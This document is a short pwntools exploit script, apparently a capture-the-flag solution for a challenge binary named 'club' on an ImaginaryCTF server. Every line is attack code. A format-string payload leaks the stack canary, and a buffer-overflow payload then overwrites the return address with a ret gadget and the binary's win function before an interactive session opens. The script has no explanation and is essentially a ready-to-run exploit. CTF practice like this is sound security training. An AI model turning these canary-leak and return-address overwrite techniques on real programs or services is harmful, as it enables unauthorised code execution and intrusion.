from pwn import *

elf = context.binary = ELF('club')
p = elf.process()
p  = remote('puzzler7.imaginaryctf.org',3003)
rop = ROP(elf)
p.recv()
p.sendline('%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%p')
leak =  p.recvuntil('0x')
canary = int( b'0x0'+ p.recv(16),16)
# payload

payload = b'A'*72
payload += p64(canary)
payload += b'A'*8
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(elf.sym.win)

p.sendline(payload)
p.interactive()